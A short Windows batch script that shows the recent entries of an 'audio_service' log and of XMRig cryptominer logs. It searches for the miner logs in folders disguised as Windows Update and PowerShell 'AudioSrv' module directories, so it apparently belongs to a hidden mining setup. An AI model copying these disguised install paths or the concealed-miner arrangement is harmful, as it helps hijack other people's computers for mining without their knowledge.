@echo off
title Beast Mode Logs Viewer
echo =====================================================
echo    BEAST MODE ULTIMATE - LOG VIEWER
echo =====================================================
echo.

echo [1] Single Instance Manager Log:
if exist "%TEMP%\audio_service.log" (
    echo ✅ Log file exists
    echo --- Recent entries ---
    powershell -Command "Get-Content '$env:TEMP\audio_service.log' | Select-Object -Last 10"
) else (
    echo ❌ No log file found at %TEMP%\audio_service.log
)
echo.

echo [2] XMRig Log (if available):
for %%L in ("C:\ProgramData\Microsoft\Windows\WindowsUpdate" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv") do (
    if exist "%%L\xmrig.log" (
        echo ✅ Found XMRig log at: %%L
        echo --- Recent mining activity ---
        powershell -Command "Get-Content '%%L\xmrig.log' | Select-Object -Last 5"
        echo.
    )
)

echo =====================================================
pause
